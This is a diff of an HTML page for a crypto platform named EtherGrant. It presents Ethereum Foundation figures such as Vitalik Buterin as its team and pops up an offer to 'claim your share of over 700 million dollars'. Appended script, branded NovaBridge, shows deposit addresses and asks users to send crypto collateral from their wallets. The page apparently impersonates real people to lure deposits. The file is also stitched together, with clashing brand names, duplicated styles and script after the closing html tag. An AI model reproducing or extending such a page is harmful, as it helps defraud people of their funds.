@@ -3,293 +3,219 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EtherGrant — Private Digital Assets</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;1,9..144,500&family=Outfit:wght@400;500;600&display=swap" rel="stylesheet">
+<title>EtherGrant</title>
 <style>
 :root{
-  --night:#070d18; --ink:#0e1626; --panel:#141e30; --line:#243044;
-  --parchment:#f5f1e8; --mist:#8e9bb0; --leaf:#3cba74; --leaf-deep:#1e7a49;
-  --amber:#e4a853;
+  --night:#0b1220; --ink:#121a2b; --panel:#172033; --line:#2c3a52;
+  --parchment:#f3efe6; --mist:#9aa6b8; --leaf:#3cba74; --leaf-deep:#1e7a49;
 }
 *{box-sizing:border-box}
-html,body{margin:0;background:var(--night);color:var(--parchment);font:16px/1.6 Outfit,system-ui,sans-serif;-webkit-font-smoothing:antialiased}
-h1,h2,h3{font-family:Fraunces,Georgia,serif;font-weight:500;text-wrap:balance;margin:0}
+body{margin:0;background:var(--night);color:var(--parchment);font:15px/1.55 Outfit,system-ui,sans-serif}
+h1,h2,h3{font-family:Fraunces,Georgia,serif;font-weight:500;text-wrap:balance}
 a{color:inherit;text-decoration:none}
-.container{width:min(1120px,92%);margin:0 auto}
-header.site-header{
-  position:sticky;top:0;z-index:40;height:72px;display:flex;align-items:center;justify-content:space-between;
-  padding:0 24px;background:rgba(7,13,24,.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);
-}
-.logo{font-weight:600;letter-spacing:.12em;font-size:15px;display:flex;align-items:center;gap:10px}
-.logo span{color:var(--leaf)}
-.nav-btns{display:flex;gap:10px}
-.btn{
-  border:1px solid var(--line);background:transparent;color:var(--parchment);padding:10px 18px;border-radius:999px;
-  font-weight:500;cursor:pointer;font-size:14px;transition:all .2s;
-}
-.btn:hover{border-color:var(--leaf);color:var(--leaf)}
+.container{width:min(1120px,92%);margin:auto}
+.nav{height:64px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--ink);z-index:10}
+.logo{font-weight:600;letter-spacing:.08em;font-size:14px}
+.btn{border:1px solid var(--line);background:transparent;color:var(--parchment);padding:10px 16px;border-radius:999px;font-weight:500}
 .btn.primary{background:var(--leaf);color:var(--night);border-color:var(--leaf)}
-.btn.primary:hover{background:var(--leaf-deep);border-color:var(--leaf-deep)}
-
-.hero{
-  min-height:calc(100vh - 72px);display:flex;align-items:center;position:relative;overflow:hidden;
-  background:radial-gradient(ellipse at 70% 30%, #1a2a4a 0%, transparent 50%),
-             linear-gradient(180deg, #070d18 0%, #0b1525 100%);
+.hero{padding:72px 0 48px;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.eyebrow{display:inline-flex;gap:8px;align-items:center;color:var(--leaf);background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:6px 12px;font-size:12px;letter-spacing:.08em;text-transform:uppercase}
+.site-header {
+  position: sticky;
+  top: 0;
+  z-index: 40;
+  height: 64px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  padding: 0 16px;
+  border-bottom: 1px solid #2c3a52;
+  background: rgb(11 18 32 / 0.95);
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
 }
-.hero::before{
-  content:'';position:absolute;inset:0;
-  background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><path fill="%233cba74" fill-opacity="0.03" d="M0 0h100v100H0z"/><circle cx="20" cy="30" r="1" fill="%233cba74" opacity=".4"/><circle cx="70" cy="60" r="1.5" fill="%23e4a853" opacity=".3"/></svg>') repeat;
-  opacity:.6;
+
+.site-header a {
+  color: #f3efe6;
+  text-decoration: none;
 }
-.hero-inner{position:relative;z-index:1;display:grid;grid-template-columns:1.2fr .8fr;gap:60px;align-items:center;padding:80px 0}
-.eyebrow{display:inline-flex;align-items:center;gap:8px;color:var(--leaf);font-size:13px;letter-spacing:.14em;text-transform:uppercase;font-weight:500}
-.hero h1{font-size:clamp(42px,5.5vw,72px);line-height:1.05;margin:12px 0 20px}
-.hero p.lead{font-size:18px;color:var(--mist);max-width:520px;margin:0 0 28px}
-.hero-buttons{display:flex;gap:12px;flex-wrap:wrap}
 
-.mock{
-  background:rgba(20,30,48,.7);border:1px solid var(--line);border-radius:20px;padding:28px;
-  backdrop-filter:blur(8px);box-shadow:0 20px 40px rgba(0,0,0,.3);
+.site-header nav {
+  display: flex;
+  align-items: center;
+  gap: 24px;
 }
-.mock-label{font-size:11px;letter-spacing:.1em;color:var(--mist);display:flex;justify-content:space-between}
-.balance{font-size:36px;font-weight:500;margin:8px 0 4px;font-family:Fraunces,serif}
-.cash{color:var(--leaf);font-size:14px}
-.mock-row{display:flex;justify-content:space-between;margin-top:8px;font-size:14px;color:var(--mist)}
 
-.section{padding:80px 0}
-.kicker{color:var(--leaf);font-size:13px;letter-spacing:.12em;text-transform:uppercase;font-weight:500}
-.section h2{font-size:clamp(32px,4vw,48px);margin:8px 0 32px}
-
-.activity-table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden}
-.activity-table th,.activity-table td{padding:12px 16px;text-align:left;border-bottom:1px solid var(--line)}
-.activity-table th{color:var(--mist);font-size:12px;text-transform:uppercase}
-.badge{font-size:11px;border-radius:999px;padding:4px 8px;background:#163022;color:#9be4b6}
-
-.team-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px}
-.team-card{background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:transform .2s}
-.team-card:hover{transform:translateY(-4px)}
-.team-card img{width:100%;height:240px;object-fit:cover;object-position:top}
-.team-card div{padding:16px}
-.team-card h3{font-size:17px;margin:0 0 6px}
-.team-card p{margin:0;font-size:13px;color:var(--mist);line-height:1.5}
-
-footer{padding:40px 0;border-top:1px solid var(--line);color:var(--mist);font-size:14px}
-
-.claim-overlay,.modal-back{position:fixed;inset:0;background:rgba(7,13,24,.75);display:none;align-items:center;justify-content:center;z-index:100;padding:20px}
-.claim-overlay.show,.modal-back.show{display:flex}
-.modal{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:32px;max-width:420px;width:100%;box-shadow:0 30px 60px rgba(0,0,0,.4)}
-.modal h2{font-size:28px;margin:0 0 8px}
-.modal p{color:var(--mist);margin:0 0 20px}
-.modal label{display:block;font-size:13px;margin:12px 0 4px;color:var(--mist)}
-.modal input{width:100%;padding:12px;border-radius:8px;border:1px solid var(--line);background:var(--ink);color:var(--parchment);font:inherit}
-.modal .btn{width:100%;margin-top:16px;justify-content:center}
-.modal-msg{margin-top:12px;font-size:13px;color:var(--leaf)}
-.toast{position:fixed;bottom:20px;right:20px;background:var(--leaf);color:var(--night);padding:12px 20px;border-radius:8px;z-index:200}
-.error-toast{background:#ff6b6b;color:white}
-
-@media (max-width:900px){
-  .hero-inner{grid-template-columns:1fr;gap:40px;padding:60px 0}
-  header.site-header{padding:0 16px}
+.site-header .is-current {
+  color: #3cba74;
 }
+.nav, .site-header {
+  position: sticky;
+  top: 0;
+  z-index: 50;
+  height: 68px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  background: rgba(11, 18, 32, 0.92);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--line);
+  box-shadow: 0 1px 0 rgba(255,255,255,0.04);
+}
+.logo { font-weight: 600; letter-spacing: 0.1em; font-size: 15px; }
+.btn { transition: all 0.15s ease; }
+.btn:hover { transform: translateY(-1px); }
+.team-card { transition: transform 0.2s ease; }
+.team-card:hover { transform: translateY(-3px); }
 </style>
 </head>
 <body>
 
-<header class="site-header">
-  <a class="logo" href="#">ETHER<span>GRANT</span></a>
-  <div class="nav-btns">
-    <button class="btn" onclick="openClaim()">Claim</button>
-    <button class="btn" id="loginBtn" onclick="openModal('login')">Log in</button>
-    <button class="btn primary" id="signupBtn" onclick="openModal('signup')">Get started</button>
+<header class="container nav">
+  <a class="logo" href="#">EtherGrant</a>
+  <div>
+    <button class="btn" onclick="document.getElementById('claimOverlay').classList.add('show')">Claim</button>
+    <button class="btn primary">Get started</button>
   </div>
 </header>
 
+<main class="container">
 <section class="hero">
-  <div class="container hero-inner">
-    <div>
-      <div class="eyebrow">The digital asset platform</div>
-      <h1>A private account for digital assets.</h1>
-      <p class="lead">Own, hold, and move what is yours. No middlemen. Multi-chain. Built for people who understand that the future of money is self-custody and open protocols.</p>
-      <div class="hero-buttons">
-        <button class="btn primary" onclick="openModal('signup')">Open an account</button>
-        <button class="btn" onclick="document.getElementById('activity').scrollIntoView({behavior:'smooth'})">View activity</button>
-      </div>
-    </div>
-    <div class="mock">
-      <div class="mock-label"><span>ACCOUNT</span><span>USD</span></div>
-      <div class="balance" id="displayBalance">$0.00</div>
-      <div class="cash">Available cash</div>
-      <div class="mock-row"><span>Positions</span><b>None</b></div>
-      <div class="mock-row"><span>Linked wallets</span><b>None</b></div>
+  <div>
+    <span class="eyebrow"><span style="width:7px;height:7px;background:var(--leaf);border-radius:50%"></span> The digital asset platform</span>
+    <h1>A private account for digital assets.</h1>
+    <p>Review the account, link a wallet you control, and move funds with written instructions. Cash posts only after a transfer is confirmed.</p>
+    <div class="hero-buttons">
+      <button class="btn primary">Review strategies</button>
+      <button class="btn">How access works</button>
     </div>
   </div>
-</section>
-
-<section class="section" id="activity">
-  <div class="container">
-    <div class="kicker">Dashboard</div>
-    <h2>Recent activity</h2>
-    <table class="activity-table">
-      <thead><tr><th>Activity</th><th>Type</th><th>Amount</th><th>Status</th></tr></thead>
-      <tbody id="activityBody">
-        <tr><td colspan="4" style="color:var(--mist)">Log in to see your activity.</td></tr>
-      </tbody>
-    </table>
-    <div id="debug" style="margin-top:12px;font-size:12px;color:var(--mist)"></div>
-  </div>
-</section>
-
-<section class="section" id="team">
-  <div class="container">
-    <div class="kicker">Leadership</div>
-    <h2>The team</h2>
-    <div class="team-grid">
-      <article class="team-card"><img src="https://img.decrypt.co/insecure/rs:fit:3840:0:0:0/plain/https://cdn.decrypt.co/wp-content/uploads/2021/08/Webp.net-resizeimage-gID_7.jpg@webp" alt="Vitalik Buterin"><div><h3>Vitalik Buterin</h3><p>Co-founder, providing technical and intellectual vision.</p></div></article>
-      <article class="team-card"><img src="https://media.wired.jp/photos/6323ce93a837aa121874cae9/master/w_2560%2Cc_limit/_W8A0185.jpg" alt="Aya Miyaguchi"><div><h3>Aya Miyaguchi</h3><p>President, overseeing vision and external relationships.</p></div></article>
-      <article class="team-card"><img src="https://coingape.com/wp-content/uploads/2026/05/Who-Is-Bastian-Aue-The-3-Month.webp" alt="Bastian Aue"><div><h3>Bastian Aue</h3><p>Interim co-Executive Director (handling organizational strategy, hiring, and training).</p></div></article>
-      <article class="team-card"><img src="https://i.ytimg.com/vi/neSSJR_2Zvk/maxresdefault.jpg" alt="Hsiao-Wei Wang"><div><h3>Hsiao-Wei Wang</h3><p>Co-Executive Director and board member bridging the board and management.</p></div></article>
-      <article class="team-card"><div style="height:240px;background:#2c3a52"></div><div><h3>Patrick Storchenegger</h3><p>Board member and Swiss legal counsel.</p></div></article>
-      <article class="team-card"><div style="height:240px;background:#2c3a52"></div><div><h3>Katherine Hall</h3><p>Board member and Oversees project execution, communications, and marketing.</p></div></article>
+  <div class="mock">
+    <div style="display:flex;justify-content:space-between;font-size:11px;letter-spacing:.08em;color:var(--mist)">
+      <span>ACCOUNT</span><span>USD</span>
+    </div>
+    <div class="balance">$0.00</div>
+    <div style="color:var(--leaf)">Available cash</div>
+    <div style="margin-top:16px;font-size:14px;color:var(--mist)">
+      <div style="display:flex;justify-content:space-between"><span>Positions</span><b>None</b></div>
+      <div style="display:flex;justify-content:space-between;margin-top:6px"><span>Linked wallets</span><b>None</b></div>
     </div>
   </div>
 </section>
 
-<footer>
-  <div class="container">© 2026 EtherGrant · Built for the crypto community</div>
+<section class="section">
+  <div class="kicker">Leadership</div>
+  <h2 style="font-size:32px;margin:6px 0 20px">The team</h2>
+  <div class="team-grid">
+    <article class="team-card"><img src="https://img.decrypt.co/insecure/rs:fit:3840:0:0:0/plain/https://cdn.decrypt.co/wp-content/uploads/2021/08/Webp.net-resizeimage-gID_7.jpg@webp" alt="Vitalik Buterin"><div><h3>Vitalik Buterin</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">Co-founder, providing technical and intellectual vision.</p></div></article>
+    <article class="team-card"><img src="https://media.wired.jp/photos/6323ce93a837aa121874cae9/master/w_2560%2Cc_limit/_W8A0185.jpg" alt="Aya Miyaguchi"><div><h3>Aya Miyaguchi</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">President, overseeing vision and external relationships.</p></div></article>
+    <article class="team-card"><img src="https://coingape.com/wp-content/uploads/2026/05/Who-Is-Bastian-Aue-The-3-Month.webp" alt="Bastian Aue"><div><h3>Bastian Aue</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">Interim co-Executive Director (handling organizational strategy, hiring, and training).</p></div></article>
+    <article class="team-card"><img src="https://i.ytimg.com/vi/neSSJR_2Zvk/maxresdefault.jpg" alt="Hsiao-Wei Wang"><div><h3>Hsiao-Wei Wang</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">Co-Executive Director and board member bridging the board and management.</p></div></article>
+    <article class="team-card"><div style="height:220px;background:#2c3a52"></div><div><h3>Patrick Storchenegger</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">Board member and Swiss legal counsel.</p></div></article>
+    <article class="team-card"><div style="height:220px;background:#2c3a52"></div><div><h3>Katherine Hall</h3><p style="color:var(--mist);font-size:13px;margin:4px 0 0">Board member and Oversees project execution, communications, and marketing.</p></div></article>
+  </div>
+</section>
+</main>
+
+<footer class="container">
+  <p>© 2026 EtherGrant</p>
 </footer>
 
 <div class="claim-overlay" id="claimOverlay">
-  <div class="modal">
-    <h2>Claim your allocation</h2>
-    <p>Eligible participants can review and submit a claim for their share.</p>
-    <button class="btn primary" onclick="document.getElementById('claimOverlay').classList.remove('show'); openModal('signup')">Continue</button>
-    <button class="btn" style="margin-top:8px" onclick="document.getElementById('claimOverlay').classList.remove('show')">Close</button>
+  <div class="claim-modal">
+    <h2 style="font-size:28px;margin:0 0 8px">Claim your share of over 700 million dollars</h2>
+    <p style="color:var(--mist)">Eligible participants can review and submit a claim.</p>
+    <div style="margin-top:18px;display:flex;gap:8px;justify-content:center">
+      <button class="btn primary" onclick="document.getElementById('claimOverlay').classList.remove('show')">Claim now</button>
+      <button class="btn" onclick="document.getElementById('claimOverlay').classList.remove('show')">Close</button>
+    </div>
   </div>
 </div>
-
-<div class="modal-back" id="modalBack">
-  <div class="modal" id="modalContent"></div>
-</div>
-
 <script>
-const money = n => '$' + Number(n || 0).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
-const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&','<':'<','>':'>','"':'"',"'":'&#39;'}[c]));
-
-function openClaim(){ document.getElementById('claimOverlay').classList.add('show'); }
-function openModal(type){
-  const modal = document.getElementById('modalContent');
-  const back = document.getElementById('modalBack');
-  if(type === 'signup'){
-    modal.innerHTML = `
-      <h2>Open an account</h2>
-      <p>Create your EtherGrant account.</p>
-      <form onsubmit="event.preventDefault(); register()">
-        <label>Full name</label><input id="signupName" required placeholder="Your name">
-        <label>Email</label><input id="signupEmail" type="email" required placeholder="you@example.com">
-        <label>Password</label><input id="signupPassword" type="password" minlength="8" required placeholder="At least 8 characters">
-        <button class="btn primary" type="submit">Create account</button>
-      </form>
-      <div id="modalMsg" class="modal-msg"></div>
-    `;
-  } else {
-    modal.innerHTML = `
-      <h2>Log in</h2>
-      <p>Access your account.</p>
-      <form onsubmit="event.preventDefault(); login()">
-        <label>Email</label><input id="loginEmail" type="email" required placeholder="you@example.com">
-        <label>Password</label><input id="loginPassword" type="password" required placeholder="Password">
-        <button class="btn primary" type="submit">Log in</button>
-      </form>
-      <div id="modalMsg" class="modal-msg"></div>
-    `;
+(function(){
+  if (!sessionStorage.getItem("claim-seen")) {
+    document.getElementById("claimOverlay").classList.add("show");
+    sessionStorage.setItem("claim-seen", "1");
   }
-  back.classList.add('show');
-}
-function closeModal(){ document.getElementById('modalBack').classList.remove('show'); }
-function toast(m, isError){
-  const t = document.createElement('div');
-  t.className = 'toast' + (isError ? ' error-toast' : '');
-  t.textContent = m;
-  document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3500);
-}
-function debug(msg){
-  const el = document.getElementById('debug');
-  if(el) el.textContent = msg;
-}
-async function api(url, opt={}){
-  const r = await fetch(url, {credentials:'same-origin', headers:{'Content-Type':'application/json'}, ...opt});
-  const d = await r.json().catch(()=>({}));
-  if(!r.ok) throw Error(d.error || 'Request failed (' + r.status + ')');
-  return d;
-}
-async function register(){
-  try{
-    await api('/api/register', {method:'POST', body:JSON.stringify({
-      name: document.getElementById('signupName').value,
-      email: document.getElementById('signupEmail').value,
-      password: document.getElementById('signupPassword').value
-    })});
-    document.getElementById('modalMsg').textContent = 'Account created. Check your email to verify.';
-    toast('Account created');
-    setTimeout(() => { closeModal(); loadDashboard(); }, 800);
-  }catch(e){ 
-    document.getElementById('modalMsg').textContent = e.message;
-    toast(e.message, true);
-  }
-}
-async function login(){
-  try{
-    await api('/api/login', {method:'POST', body:JSON.stringify({
-      email: document.getElementById('loginEmail').value,
-      password: document.getElementById('loginPassword').value
-    })});
-    document.getElementById('modalMsg').textContent = 'Welcome back.';
-    toast('Welcome back');
-    closeModal();
-    await loadDashboard();
-  }catch(e){ 
-    document.getElementById('modalMsg').textContent = e.message;
-    toast(e.message, true);
-  }
-}
-async function loadDashboard(){
-  try{
-    const d = await api('/api/dashboard');
-    const cash = d.portfolio?.cash ?? 0;
-    document.getElementById('displayBalance').textContent = money(cash);
-    const body = document.getElementById('activityBody');
-    if(d.activities && d.activities.length){
-      body.innerHTML = d.activities.map(a => 
-        `<tr><td>${esc(a.activity||'')}</td><td>${esc(a.type||'')}</td><td>${money(a.amount)}</td><td><span class="badge">${esc(a.status||'')}</span></td></tr>`
-      ).join('');
-    } else {
-      body.innerHTML = '<tr><td colspan="4" style="color:var(--mist)">No activity yet.</td></tr>';
-    }
-    debug('Dashboard loaded');
-  }catch(e){
-    debug('Dashboard error: ' + e.message);
-    toast('Dashboard: ' + e.message, true);
-  }
-}
-// Check session on load
-(async () => {
-  try{
-    const me = await fetch('/api/me', {credentials:'same-origin'}).then(r => r.ok ? r.json() : null);
-    if(me && me.authenticated && me.user){
-      debug('Session found: ' + me.user.email);
-      await loadDashboard();
-    } else {
-      debug('Not logged in');
-    }
-  }catch(e){ debug('Session check failed: ' + e.message); }
 })();
-if (!sessionStorage.getItem("claim-seen")) {
-  setTimeout(openClaim, 1200);
-  sessionStorage.setItem("claim-seen", "1");
-}
 </script>
 </body>
 </html>
+
+<script>
+const $=id=>document.getElementById(id);
+const money=n=>'$'+Number(n||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
+function accountNumber(id){const n=(Number(id)*104729+48031)%90000000+10000000;const s=String(n);return s.slice(0,4)+'-'+s.slice(4)}
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&','<':'<','>':'>','"':'"',"'":'&#39;'}[c]));
+let currentUser=null, fundingAfterLogin=false, withdrawAfterLogin=false, availableCash=0, emailVerified=false, depositNetworks=[], pendingFunding={amount:0,network:'bitcoin'}, linkedWallets=[];
+function toggleMobileNav(){const nav=document.querySelector('.navlinks'),button=document.querySelector('.mobile-menu'),open=!nav.classList.contains('open');nav.classList.toggle('open',open);button.setAttribute('aria-expanded',String(open))}
+const WALLET_HINTS={bitcoin:'bc1… or 1… or 3…',ethereum:'0x followed by 40 hex characters',solana:'Solana wallet address',xrp:'XRP address (starts with r)',stellar:'Stellar address (starts with G)',zcash:'Zcash transparent address (t1… or t3…)'};
+const NETWORK_LABELS={bitcoin:'Bitcoin',ethereum:'Ethereum',solana:'Solana',xrp:'XRP',stellar:'Stellar',zcash:'Zcash'};
+const WITHDRAW_NETWORKS=Object.keys(NETWORK_LABELS);
+async function api(url,opt={}){const r=await fetch(url,{credentials:'same-origin',headers:{'Content-Type':'application/json'},...opt});const d=await r.json().catch(()=>({}));if(!r.ok)throw Error(d.error||'Request failed');return d}
+function calculate(){const a=+$('amount').value,r=+$('rate').value,y=+$('years').value,e=a*Math.pow(1+r,y);$('amountLabel').textContent='$'+a.toLocaleString();$('ending').textContent='$'+Math.round(e).toLocaleString();$('gain').textContent='+$'+Math.round(e-a).toLocaleString()+' at selected scenario rate'}
+function scrollToId(id){document.getElementById(id)?.scrollIntoView({behavior:'smooth',block:'start'})}
+function closeModal(){$('modalBack').classList.remove('show')}
+function openModal(type){
+const d={
+login:['ACCOUNT','Log in',`<p class="muted">Access your NovaBridge account.</p><form onsubmit="event.preventDefault();login()"><label for="loginEmail">Email</label><input id="loginEmail" name="email" type="email" autocomplete="username" inputmode="email" required placeholder="you@example.com"><label for="loginPassword">Password</label><input id="loginPassword" name="password" type="password" autocomplete="current-password" required placeholder="Password"><button class="btn primary" type="submit" style="width:100%;margin-top:18px">Log in</button></form><button class="btn ghost" style="width:100%;margin-top:10px" onclick="openModal('resetRequest')">Forgot password?</button><div id="modalMsg" role="status" aria-live="polite"></div>`],
+signup:['ACCOUNT','Create your account',`<p class="muted">Create your NovaBridge account and access your portfolio.</p><form onsubmit="event.preventDefault();register()"><label for="signupName">Full name</label><input id="signupName" name="name" autocomplete="name" required placeholder="Alex Morgan"><label for="signupEmail">Email</label><input id="signupEmail" name="email" type="email" autocomplete="email" inputmode="email" required placeholder="you@example.com"><label for="signupPassword">Password</label><input id="signupPassword" name="new-password" type="password" autocomplete="new-password" minlength="8" required placeholder="At least 8 characters"><button class="btn primary" type="submit" style="width:100%;margin-top:18px">Create account</button></form><div id="modalMsg" role="status" aria-live="polite"></div>`],
+learn:['HOW ACCESS WORKS','A considered process',`<div class="card"><b>01 — Review</b><p class="muted">Compare the mandate, terms, liquidity profile, and risks of each strategy.</p><b>02 — Qualify</b><p class="muted">Create an account and complete the eligibility checks that apply to your jurisdiction.</p><b>03 — Fund</b><p class="muted">Verify the receiving details before submitting a funding request.</p><b>04 — Monitor</b><p class="muted">Track available cash, requests, and account activity from your dashboard.</p></div><div class="notice">Access is subject to eligibility, applicable law, product availability, and required disclosures.</div>`],
+resetRequest:['ACCOUNT SECURITY','Reset your password',`<p class="muted">Enter your account email. If it exists, we will send reset instructions.</p><label>Email</label><input id="resetEmail" type="email" placeholder="you@example.com"><button class="btn primary" style="width:100%;margin-top:18px" onclick="requestPasswordReset()">Send reset link</button><div id="modalMsg"></div>`],
+deposit:['FUNDING','Fund your account','']};
+const x=d[type]||d.learn;$('modalKicker').textContent=x[0];$('modalTitle').textContent=x[1];$('modalBody').innerHTML=x[2];$('modalBack').classList.add('show')}
+function updateAuthUi(){const actions=$('authActions');document.body.classList.toggle('logged-in',Boolean(currentUser));if(currentUser){const acct=currentUser.accountNumber||accountNumber(currentUser.id);$('accountName').textContent=currentUser.name;if($('accountEmail'))$('accountEmail').textContent=' · '+currentUser.email;if($('accountNumber'))$('accountNumber').textContent=acct;$('dashboardGreeting').textContent=currentUser.name;if($('accountSubtitle'))$('accountSubtitle').textContent='Account '+acct+' · USD';$('accountBar').classList.add('show');const adminLink=currentUser.role==='admin'?'<a class="admin-link" href="/admin.html">Admin</a>':'';actions.innerHTML='<button class="btn ghost hide-sm" onclick="scrollToId(\'activity\')">Account</button><button class="btn hide-sm" onclick="openLinkWallet()">Wallets</button><button class="btn primary" onclick="openFunding()">Transfer in</button>'+adminLink}else{$('accountBar').classList.remove('show');actions.innerHTML='<button class="btn ghost" onclick="openModal(\'login\')">Log in</button><button class="btn primary" onclick="openModal(\'signup\')">Open an account</button>'}}
+async function loadDepositNetworks(){
+  const d=await api('/api/deposit-addresses');
+  depositNetworks=d.networks||[];
+  return depositNetworks;
+}
+function networkOptions(selected){
+  const list=depositNetworks.length?depositNetworks:WITHDRAW_NETWORKS.map(id=>({id,name:NETWORK_LABELS[id]}));
+  return list.map(n=>`<option value="${esc(n.id)}"${n.id===selected?' selected':''}>${esc(n.name||NETWORK_LABELS[n.id]||n.id)}</option>`).join('');
+}
+async function openFunding(){
+  if(!currentUser){fundingAfterLogin=true;openModal('login');return}
+  try{
+    const networks=await loadDepositNetworks();
+    const options=networks.map(n=>`<option value="${esc(n.id)}">${esc(n.name)}</option>`).join('');
+    $('modalKicker').textContent='TRANSFERS';
+    $('modalTitle').textContent='Transfer in';
+    $('modalBody').innerHTML=`<p class="muted">Choose the amount and network. You will get the receiving address for this account. Linking your own wallet is separate and does not send the funds.</p><label>Amount (USD)</label><input id="fundingAmount" type="number" value="5000" min="100"><label>Network</label><select id="fundingNetwork">${options}</select><button class="btn primary" style="width:100%;margin-top:18px" onclick="showWalletStep()">Continue</button><div id="modalMsg"></div>`;
+    $('modalBack').classList.add('show');
+  }catch(e){
+    $('modalKicker').textContent='FUNDING';
+    $('modalTitle').textContent='Fund your account';
+    $('modalBody').innerHTML='<div class="notice">'+esc(e.message)+'</div>';
+    $('modalBack').classList.add('show');
+  }
+}
+function updateWithdrawHint(){const input=$('withdrawWallet');if(input)input.placeholder=WALLET_HINTS[$('withdrawNetwork').value]||'Wallet address';const slot=$('linkedPickSlot');if(slot)slot.innerHTML=linkedPickHtml($('withdrawNetwork').value)}
+function shortAddr(a){return a&&a.length>18?a.slice(0,8)+'…'+a.slice(-6):a}
+function linkedPickHtml(network){const rows=linkedWallets.filter(w=>w.network===network);if(!rows.length)return '';return `<label>Linked wallet</label><select id="linkedPick" onchange="applyLinkedWallet()"><option value="">Enter a different address</option>${rows.map(w=>`<option value="${esc(w.address)}">${esc(w.label||NETWORK_LABELS[w.network]||w.network)} · ${esc(shortAddr(w.address))}</option>`).join('')}</select>`}
+function applyLinkedWallet(){const pick=$('linkedPick');if(pick&&$('withdrawWallet'))$('withdrawWallet').value=pick.value}
+function renderLinkedWallets(){const box=$('linkedWalletList');if(!box)return;if(!linkedWallets.length){box.innerHTML='<p class="muted">No wallet connected yet.</p>';return}box.innerHTML=linkedWallets.map(w=>{const state=w.source==='connected'?'Approved in wallet':'Address on file';return `<div class="wallet-row"><div><b>${esc(w.wallet_name||w.label||NETWORK_LABELS[w.network]||w.network)}</b><span>${esc(NETWORK_LABELS[w.network]||w.network)} · ${esc(state)} · ${esc(w.address)}</span></div><button class="btn" type="button" onclick="removeLinkedWallet(${Number(w.id)})">Remove</button></div>`}).join('')}
+async function loadLinkedWallets(){try{const d=await api('/api/linked-wallets');linkedWallets=d.wallets||[]}catch(_){linkedWallets=[]}renderLinkedWallets()}
+async function loadApplications(){const box=$('applicationList');if(!box)return;try{const d=await api('/api/applications');applicationCache=d.applications||[];box.innerHTML=applicationCache.length?applicationCache.map(a=>`<div class="wallet-row"><div><b>${a.product==='credit_card'?'Credit card':'Loan'} · ${money(a.amount)}</b><span>${esc(a.status)} · Collateral ${esc(a.collateral_amount||'')} ${esc(a.collateral_symbol||'')} · ${esc(a.collateral_status||'Awaiting')}</span></div>${a.status==='Pending'&&a.collateral_status!=='Received'?`<button class="btn" type="button" onclick="resumePledge(${Number(a.id)})">Send collateral</button>`:''}</div>`).join(''):'<p class="muted">No applications yet.</p>'}catch(_){box.innerHTML='<p class="muted">No applications yet.</p>'}}
+let applicationCache=[];
+function resumePledge(id){const app=applicationCache.find(item=>Number(item.id)===Number(id));if(!app)return;showPledge(app);$('modalBack').classList.add('show')}
+function openApplication(product){if(!currentUser){openModal('login');return}if(!linkedWallets.length){openLinkWallet();return}const title=product==='credit_card'?'Credit card application':'Loan application';const options=linkedWallets.map(w=>`<option value="${Number(w.id)}">${esc(w.wallet_name||w.label||NETWORK_LABELS[w.network]||w.network)} · ${esc(shortAddr(w.address))}</option>`).join('');const first=linkedWallets[0];$('modalKicker').textContent='CREDIT';$('modalTitle').textContent=title;$('modalBody').innerHTML=`<p class="muted">A $5,000 loan needs $2,500 of crypto sent in. You approve that send in your wallet. The rest of the wallet is not pledged.</p><label>Connected wallet</label><select id="applicationWallet" onchange="syncCollateralAssets()">${options}</select><label>Collateral to send</label><div class="dashboard-actions"><select id="applicationSymbol">${collateralOptions(first.network)}</select><input id="applicationCollateral" type="number" min="0" step="any" placeholder="Amount"></div><label>Amount requested (USD)</label><input id="applicationAmount" type="number" min="500" max="250000" value="5000"><label>Purpose</label><input id="applicationPurpose" maxlength="240" placeholder="What the credit is for"><button class="btn primary" style="width:100%;margin-top:16px" type="button" onclick="submitApplication('${product}')">Continue to pledge</button><div id="modalMsg"></div>`;$('modalBack').classList.add('show')}
+const COLLATERAL={bitcoin:['BTC'],ethereum:['ETH','USDT','USDC','DAI'],solana:['SOL','USDC'],xrp:['XRP'],stellar:['XLM'],zcash:['ZEC']};
+function collateralOptions(network){return (COLLATERAL[network]||[]).map(symbol=>`<option value="${symbol}">${symbol}</option>`).join('')}
+function syncCollateralAssets(){const wallet=linkedWallets.find(item=>item.id===+$('applicationWallet').value);if(wallet&&$('applicationSymbol'))$('applicationSymbol').innerHTML=collateralOptions(wallet.network)}
